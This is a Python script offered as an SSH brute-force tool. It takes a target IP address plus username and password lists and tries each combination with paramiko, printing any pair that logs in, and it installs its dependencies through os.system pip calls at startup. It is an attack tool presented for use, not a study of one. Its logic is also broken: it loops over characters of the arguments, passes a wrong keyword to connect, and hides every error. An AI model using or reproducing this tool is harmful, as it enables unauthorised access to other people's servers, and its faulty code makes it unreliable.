import os 

os.system("pip install paramiko")
os.system("pip3 install paramiko")
os.system("pip install argparse")
os.system("pip3 install argparse")
os.system("pip install colorama")
os.system("pip3 install colorama")

import paramiko
import argparse
import colorama
from colorama import Back,Fore,Style
colorama.init()
argparser = argparse.ArgumentParser(description='SHH Br6te F0rce T001')

client= paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy)

argparser.add_argument('-i', '--ipadress', required=True, help="Enter Target Ip Adresses")
argparser.add_argument('-l','--login',required=True,help="Enter SSH username list")
argparser.add_argument('-p','--passw',required=True,help='Enter password List')
args = argparser.parse_args()
try:
    print("["+f"{Fore.GREEN}+"+f"{Fore.WHITE}]"+"Checking Wordlists")
    for i in args.login:
        for j in args.passw:
            try:
                sonuc = client.connect(ip=args.ipadress,username=i,password=j)
                client.close()
                print("["+f"{Fore.GREEN}+"+f"{Fore.WHITE}]"+"Us2rn4me: ",f"{Fore.GREEN}{i}",f"{Fore.WHITE}","P4ss : "f"{Fore.GREEN}{j}")
            except:
                print("["+f"{Fore.RED}"+"-"+f"{Fore.WHITE}]","{} and {} is not Valid".format(i,j))
except:
    print("["+f"{Fore.RED}"+"-"+f"{Fore.WHITE}]"+"Pls Enter The Arguments")
